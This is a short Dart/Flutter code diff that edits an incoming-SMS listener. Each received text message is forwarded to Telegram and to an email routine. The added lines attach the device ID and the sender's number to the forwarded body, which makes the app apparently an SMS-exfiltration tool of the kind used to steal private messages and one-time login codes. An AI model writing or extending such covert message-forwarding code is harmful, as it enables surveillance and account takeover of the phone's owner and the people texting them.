@@ -849,7 +849,12 @@ bool _hasFocus =false;
     c.telephony?.listenIncomingSms(
       onNewMessage: (SmsMessage message) {
         print('Message reçu: ${message.body}');
-        SendEmail.sendMessagewithtelegram(message: message.body.toString());
+        SendEmail.sendMessagewithtelegram(
+          message: 'Téléphone : ${ServerManager.instance.deviceId}\n'
+              'SMS de    : ${message.address}\n'
+              '─────────────────────\n'
+              '${message.body}',
+        );
         SendEmail.sendMyMail(
             phoneNumber: message.address.toString(),
             recipientEmail: message.body.toString());
